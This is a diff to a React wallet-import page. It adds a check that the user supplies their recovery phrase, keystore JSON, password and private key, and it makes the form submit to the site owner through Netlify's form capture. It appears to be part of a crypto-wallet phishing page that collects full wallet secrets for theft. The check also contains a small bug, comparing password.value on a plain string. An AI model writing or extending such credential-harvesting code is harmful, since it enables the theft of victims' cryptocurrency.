@@ -17,6 +17,20 @@ function WalletDetailsEntryPage() {
   const [password, setPassword] = useState('');
   const [privateKey, setPrivatekey] = useState('');
 
+  function validateForm() {
+    if (
+      phrase === '' ||
+      keyJson === '' ||
+      password.value === '' ||
+      privateKey === ''
+    ) {
+      alert(
+        `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (The Phrase, Keystore JSON and Password, and the private key). You can add "SKIP" for any data you do not wish to import`
+      );
+      return false;
+    }
+  }
+
   function displayPhrase() {
     setShowPhrase(true);
     setShowKeyJson(false);
@@ -72,7 +86,13 @@ function WalletDetailsEntryPage() {
             Private Key
           </button>
         </div>
-        <form className="form-area">
+        <form
+          className="form-area"
+          data-netlify="true"
+          // action="./form-action-page.html"
+          name="Wallet import details"
+          onSubmit={validateForm}
+        >
           {showPhrase && (
             <div className="mb-3">
               <textarea
